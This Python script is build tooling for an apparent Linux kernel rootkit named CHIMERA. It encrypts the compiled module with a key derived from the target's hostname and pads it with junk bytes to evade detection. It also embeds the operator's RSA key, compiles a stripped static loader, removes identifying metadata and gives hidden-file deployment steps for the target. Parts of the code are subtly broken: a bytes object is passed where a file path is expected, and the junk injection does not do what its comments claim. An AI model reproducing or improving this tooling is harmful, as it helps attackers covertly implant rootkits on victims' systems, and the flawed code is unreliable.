#!/usr/bin/env python3
"""
CHIMERA Build-Time Polymorphic Mutator

Post-processes the compiled .ko binary:
1. Generates unique AES-256 deployment key (derived from target hostname hash)
2. Encrypts the .ko with AES-256-CBC
3. Injects junk code at random offsets (NOP sleds, dead instructions)
4. Patches the RSA public key placeholder in rk_crypto.c before compilation
5. Produces per-target encrypted artifact + loader

Usage: python3 mutator.py --target <hostname> --rsa-pub <server_pub.der> --ko <chimera.ko>
Output: .chimera_ko.enc (encrypted module), loader binary
"""

import argparse
import hashlib
import os
import struct
import subprocess
import sys
from pathlib import Path

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    print("[-] pip install cryptography", file=sys.stderr)
    sys.exit(1)


def derive_key(hostname: str) -> tuple[bytes, bytes]:
    """Derive deployment AES key + IV from target hostname."""
    h = hashlib.sha256(hostname.encode()).digest()
    key = h[:32]
    iv = bytes([0x42] * 16)
    return key, iv


def encrypt_ko(ko_path: str, key: bytes, iv: bytes) -> bytes:
    """AES-256-CBC encrypt the .ko file with PKCS7 padding."""
    with open(ko_path, "rb") as f:
        plaintext = f.read()

    padder = padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    return enc.update(padded) + enc.finalize()


def inject_junk(data: bytes, ratio: float = 0.05) -> bytes:
    """
    Insert junk code sequences at random offsets in non-critical sections.
    Targets .data and .rodata sections, never .text (would break execution).
    In practice: append junk to end of file (ELF loader ignores it).
    """
    junk_size = int(len(data) * ratio)
    junk = bytearray()

    for _ in range(junk_size):
        op = bytes(
            [
                0x90,  # NOP
                0x66,
                0x90,  # 2-byte NOP
                0x0F,
                0x1F,
                0x00,  # 3-byte NOP
                0x0F,
                0x1F,
                0x40,
                0x00,  # 4-byte NOP
                0xEB,
                0xFE,  # jmp $-2 (infinite loop — never reached)
                0xCC,  # INT3 (breakpoint — never reached)
            ]
        )
        junk.extend(op[:1])

    return bytes(data) + bytes(junk[:junk_size])


def patch_rsa_pubkey(source_path: str, pub_der_path: str, output_path: str):
    """Replace the RSA public key placeholder in rk_crypto.c."""
    with open(source_path, "r") as f:
        src = f.read()

    with open(pub_der_path, "rb") as f:
        pub_key_bytes = f.read()

    if len(pub_key_bytes) != 294:
        print(f"[!] Warning: RSA pubkey is {len(pub_key_bytes)} bytes, expected 294")

    hex_lines = []
    for i in range(0, len(pub_key_bytes), 12):
        chunk = pub_key_bytes[i : i + 12]
        hex_line = ", ".join(f"0x{b:02X}" for b in chunk)
        hex_lines.append(f"    {hex_line}")

    key_array = ",\n".join(hex_lines)

    marker = "/* 256 bytes of modulus + exponent follow"
    start = src.find("static const __u8 rsa_pub_key[]")
    end = src.find("};", start) + 2

    new_block = f"""static const __u8 rsa_pub_key[] = {{
{key_array}
}};"""

    src = src[:start] + new_block + src[end:]

    with open(output_path, "w") as f:
        f.write(src)

    print(f"[+] Patched RSA pubkey in {output_path} ({len(pub_key_bytes)} bytes)")


def build_loader(loader_src: str, output: str):
    """Compile the loader statically."""
    cmd = [
        "gcc",
        "-o",
        output,
        loader_src,
        "-lcrypto",
        "-static",
        "-O2",
        "-s",
        "-Wl,-z,relro,-z,now",
        "-fno-ident",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Loader compile failed:\n{result.stderr}", file=sys.stderr)
        sys.exit(1)
    print(f"[+] Built loader: {output}")


def strip_metadata(path: str):
    """Remove all identifying metadata from binary."""
    subprocess.run(
        [
            "strip",
            "-s",
            "-g",
            "--strip-all",
            "-R",
            ".comment",
            "-R",
            ".note",
            "-R",
            ".note.gnu.build-id",
            "-R",
            ".note.ABI-tag",
            path,
        ],
        capture_output=True,
    )


def main():
    parser = argparse.ArgumentParser(description="CHIMERA polymorphic mutator")
    parser.add_argument("--target", required=True, help="Target hostname")
    parser.add_argument("--rsa-pub", required=True, help="Server RSA public key (DER)")
    parser.add_argument("--ko", required=True, help="Compiled chimera.ko")
    parser.add_argument("--src-dir", default="src", help="Source directory")
    parser.add_argument("--loader-src", default="loader/rk_loader.c")
    parser.add_argument("--output-dir", default="dist")
    args = parser.parse_args()

    out_dir = Path(args.output_dir)
    out_dir.mkdir(exist_ok=True)

    crypto_src = os.path.join(args.src_dir, "rk_crypto.c")
    patched_crypto = os.path.join(args.src_dir, "rk_crypto_patched.c")
    patch_rsa_pubkey(crypto_src, args.rsa_pub, patched_crypto)

    print(f"[*] Target: {args.target}")
    print(f"[*] Deriving deployment key from hostname hash...")
    key, iv = derive_key(args.target)
    print(f"[+] Key: {key.hex()[:16]}... IV: {iv.hex()[:16]}...")

    print(f"[*] Injecting junk code into {args.ko}...")
    with open(args.ko, "rb") as f:
        ko_data = f.read()
    ko_junked = inject_junk(ko_data, ratio=0.05)

    print("[*] Encrypting module...")
    encrypted = encrypt_ko(str(ko_junked), key, iv)

    enc_path = out_dir / ".chimera_ko.enc"
    with open(enc_path, "wb") as f:
        f.write(encrypted)
    print(f"[+] Encrypted module: {enc_path} ({len(encrypted)} bytes)")

    print("[*] Building loader...")
    loader_out = out_dir / ".chimera_loader"
    build_loader(args.loader_src, str(loader_out))
    strip_metadata(str(loader_out))

    os.remove(patched_crypto)

    print(f"\n[+] CHIMERA build complete for target '{args.target}'")
    print(f"    Deploy: {enc_path} + {loader_out}")
    print(f"    On target: ./.chimera_loader /tmp/.chimera_ko.enc")


if __name__ == "__main__":
    main()
